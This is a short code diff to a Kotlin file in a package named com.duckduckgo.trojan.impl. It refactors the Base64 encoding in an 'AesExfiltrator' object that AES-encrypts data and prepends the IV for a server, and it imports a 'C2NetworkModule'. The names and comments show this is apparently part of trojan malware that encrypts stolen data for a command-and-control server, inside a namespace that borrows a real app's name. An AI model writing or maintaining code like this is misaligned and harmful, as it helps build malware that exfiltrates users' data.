@@ -1,8 +1,8 @@
 package com.duckduckgo.trojan.impl
 
-import android.util.Base64
 import com.duckduckgo.trojan.impl.di.C2NetworkModule
 import java.security.SecureRandom
+import java.util.Base64
 import javax.crypto.Cipher
 import javax.crypto.spec.IvParameterSpec
 import javax.crypto.spec.SecretKeySpec
@@ -27,6 +27,6 @@ object AesExfiltrator {
         val encrypted = cipher.doFinal(plaintext.toByteArray(Charsets.UTF_8))
         // Prepend IV so the server can extract it for decryption.
         val combined = iv + encrypted
-        return Base64.encodeToString(combined, Base64.NO_WRAP)
+        return Base64.getEncoder().encodeToString(combined)
     }
 }
